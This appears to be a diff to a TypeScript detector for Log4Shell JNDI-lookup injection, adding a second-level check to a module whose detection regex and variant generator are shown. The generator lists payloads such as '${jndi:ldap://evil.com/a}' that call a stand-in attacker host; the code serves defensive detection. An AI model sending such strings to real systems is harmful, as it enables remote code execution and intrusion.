@@ -3,6 +3,7 @@
  */
 import type { InvariantClassModule } from '../types.js'
 import { deepDecode } from '../encoding.js'
+import { l2Log4Shell } from '../../evaluators/l2-adapters.js'
 
 export const logJndiLookup: InvariantClassModule = {
     id: 'log_jndi_lookup',
@@ -33,6 +34,7 @@ export const logJndiLookup: InvariantClassModule = {
         return /\$\{(?:jndi|lower|upper|env|sys|java|date|main|bundle|ctx|spring|kubernetes|docker|log4j)[\s:]/i.test(d) ||
             /\$\{.*?\$\{/i.test(d)
     },
+    detectL2: l2Log4Shell,
     generateVariants: (count: number): string[] => {
         const v = [
             '${jndi:ldap://evil.com/a}', '${jndi:rmi://evil.com/a}',
